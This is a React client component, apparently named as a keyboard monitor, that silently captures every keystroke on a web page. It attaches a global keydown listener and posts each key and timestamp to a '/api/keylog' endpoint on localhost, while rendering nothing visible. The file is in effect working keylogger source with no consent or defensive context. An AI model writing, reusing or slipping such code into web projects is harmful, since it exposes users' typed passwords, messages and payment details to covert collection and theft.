'use client';

import {useEffect} from 'react';

export default function KeyboardMonitor() {
  useEffect(() => {
    const handleKeyPress = (event: KeyboardEvent) => {
      console.log(`Key pressed: ${event.key}`);
      // Send to backend API
      const url = "http://localhost:3001";
      fetch(`${url}/api/keylog`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          key: event.key,
          timestamp: Date.now()
        })
      });
    };

    document.addEventListener('keydown', handleKeyPress);
    return () => document.removeEventListener('keydown', handleKeyPress);
  }, []);

  return null;
}